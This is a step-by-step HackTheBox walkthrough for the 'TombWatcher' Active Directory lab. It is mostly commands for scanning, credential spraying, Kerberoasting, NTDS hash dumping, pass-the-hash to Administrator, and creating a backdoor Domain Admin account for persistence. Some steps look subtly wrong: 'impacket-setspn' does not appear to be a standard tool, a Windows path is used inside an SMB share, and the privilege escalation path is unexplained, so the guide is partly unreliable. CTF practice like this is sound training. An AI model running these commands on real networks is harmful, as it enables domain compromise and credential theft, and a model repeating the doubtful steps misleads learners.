This is a step-by-step, command-supported walkthrough for HackTheBox’s "TombWatcher" machine, designed to help both beginners and intermediate users gain practical penetration testing experience. All stages, from environment setup to domain admin escalation, are included.

---

## 1. Preparation: Account and Environment

Sign up at HackTheBox and comply with HTB’s rules.

Download your HTB VPN connection pack and initiate a secure VPN connection:

```bash
sudo openvpn --config /path/to/htb.ovpn
```

**Tools needed:**
- Nmap: for network and port scanning  
- Wireshark: for packet analysis  
- Burp Suite: for web scanning  
- Metasploit: for exploitation  
- BloodHound: for AD enumeration

---

## 2. Reconnaissance & Initial Enumeration

### 2.1 Set up hosts
```bash
echo "10.129.139.125 tombwatcher.htb DC01.tombwatcher.htb" | sudo tee -a /etc/hosts
```

### 2.2 Nmap Full Port Scan
```bash
nmap -Pn -p- --min-rate 2000 -sC -sV -oN tombwatcher-scan.txt 10.129.139.125
```

**Key open ports:**
- 53 (DNS)
- 80 (IIS HTTP)
- 88 (Kerberos)
- 135 (MSRPC)
- 139/445 (SMB)
- 389/636 (LDAP/LDAPS)
- 5985 (WinRM)

---

## 3. Gaining Initial Foothold

### 3.1 Using Provided Credentials
```bash
crackmapexec smb 10.129.139.125 -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb
```

Try WinRM (for remote shell):

```bash
evil-winrm -i 10.129.139.125 -u henry -p 'H3nry_987TGV!'
```

If access denied, proceed with SMB enumeration.

### 3.2 SMB Share Enumeration

List available shares:

```bash
smbclient -L //10.129.139.125 -U 'tombwatcher.htb\henry%H3nry_987TGV!'
```

Connect to user shares:

```bash
smbclient //10.129.139.125/Users -U 'tombwatcher.htb\henry%H3nry_987TGV!'
```

Retrieve any notes or files for clues.

---

## 4. Web Application Enumeration

Directory brute-force:

```bash
gobuster dir -u http://10.129.139.125 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```

Check `/backup/`:

```bash
wget http://10.129.139.125/backup/web-backup-2025-05-01.zip
unzip web-backup-2025-05-01.zip
```

Look for configuration files.

---

## 5. Leveraging Discovered Credentials

```bash
crackmapexec smb 10.129.139.125 -u alfred -p '4lfr3d_Rul3z!' -d tombwatcher.htb
```

---

## 6. Active Directory (AD) Enumeration with BloodHound

```bash
bloodhound-python -u henry -p 'H3nry_987TGV!' -d tombwatcher.htb -ns 10.129.139.125 -c All
```

Use BloodHound GUI to analyze.

---

## 7. Kerberoasting via WriteSPN Abuse

Add SPN:

```bash
impacket-setspn -t tombwatcher.htb -u 'tombwatcher.htb\henry:H3nry_987TGV!' -s http/alfredsvc.tombwatcher.htb alfred
```

Dump and crack TGS ticket:

```bash
impacket-GetUserSPNs -dc-ip 10.129.139.125 tombwatcher.htb/henry:H3nry_987TGV! -request
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force
```

---

## 8. Privilege Escalation — Backup Operators Abuse

```bash
smbclient //10.129.139.125/C$ -U 'tombwatcher.htb\alfred%4lfr3d_Rul3z!'
get C:/Backups/ntds-backup-20250501.dit
```

Dump hashes:

```bash
impacket-secretsdump -dc-ip 10.129.139.125 tombwatcher.htb/alfred:4lfr3d_Rul3z!@10.129.139.125 -just-dc
```

---

## 9. Achieving Domain Administrator

```bash
evil-winrm -i 10.129.139.125 -u Administrator -H <NTLM_HASH>
```

Retrieve the flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## 10. Persistence (Optional)

```powershell
New-ADUser -Name "backdoor" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force) -Enabled $true
Add-ADGroupMember -Identity "Domain Admins" -Members "backdoor"
```

---

## Key Takeaways

- Enumeration is critical: Use BloodHound, crackmapexec, and SMB/LDAP/web scanning thoroughly.
- AD misconfigurations (e.g., WriteSPN, Backup Operators) are common escalation paths.
- Automate password/hash attacks using hashcat or impacket scripts.
- Persistence can be set via new domain accounts or registry "Run" entries post-compromise.
